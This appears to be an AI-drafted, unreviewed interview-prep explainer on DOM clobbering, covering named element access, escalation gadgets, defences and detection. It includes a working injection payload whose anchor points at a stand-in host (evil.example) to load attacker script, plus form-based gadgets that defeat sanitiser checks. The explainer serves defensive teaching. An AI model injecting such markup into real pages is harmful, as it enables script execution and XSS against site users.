What is DOM clobbering and how do attackers exploit named HTML elements to overwrite global variables?

Frontend engineer · Gear 3 (Senior) · Security · Difficulty: hard · AI-drafted, not yet reviewed by a person

In 30 seconds

DOM clobbering abuses the legacy behaviour where elements with id or name attributes become properties on window or document. An attacker who can inject harmless looking HTML (no script) can shadow global variables or object properties that code later reads, turning into script loading or XSS. Prevent it with sanitisation, explicit declarations and safe lookups.

Explained in depth

The browser feature

Named access on the Window object: an element with id="foo" becomes window.foo. Forms and some elements with name attributes become properties of document and of the form itself. This is legacy behaviour kept for compatibility.

<img id="config">
<script>
  // developer assumed a global config object, or that it is undefined and uses a default
  const cfg = window.config || { url: '/app.js' };
  loadScript(cfg.url);
</script>

With injected <img id="config">, window.config is now an element, truthy, so the default is skipped and cfg.url is undefined.

Escalating to code execution

Two elements with the same id create an HTMLCollection, and a named child gives a nested property:

<a id="config"></a>
<a id="config" name="url" href="https://evil.example/payload.js"></a>

window.config.url now resolves to the second anchor, and anchors stringify to their href, so script.src = config.url loads attacker code. Other gadgets: <form id="x"><input name="y" value="..."></form> gives x.y.value, overriding document.cookie, document.getElementById or attributes, and attacking sanitizer logic itself (forms with name="attributes" break DOMPurify-style checks in old versions).

Why it matters

It bypasses filters that strip <script> and event handlers, because the injected markup is considered safe. Real world cases: bugs in Gmail AMP, Google Analytics, and multiple libraries and sanitiser bypasses.

Defences

  • Sanitise user HTML with DOMPurify (it removes dangerous names, and its SANITIZE_DOM option is on by default), and consider stripping id and name from untrusted markup (FORBID_ATTR), or prefix them.
  • Declare variables explicitly (const, let, var, module scope) rather than relying on globals; use window.config = window.config ?? ... only with type checks.
  • Type check before use: if (cfg instanceof HTMLElement) rejects, or verify typeof cfg.url === 'string' and a strict URL allow-list.
  • Avoid window.x and document.x lookups for application data; use getElementById intentionally, Object.hasOwn, and Maps for configuration.
  • Use Content Security Policy with nonces and strict-dynamic, Trusted Types (blocks injection into script sinks), object-src 'none', and Object.freeze on configuration.
  • Run code as ES modules (module scope does not expose variables on window) and avoid inline scripts reading global config.
  • Lint for implicit globals (no-undef, no-implicit-globals) and add tests that inject colliding ids.

Detection

Security review of code that reads window.* or document.* properties near user-controlled HTML (comments, rich text, markdown rendering, email viewers, AMP), plus tools such as Burp DOM Invader which tests clobbering.
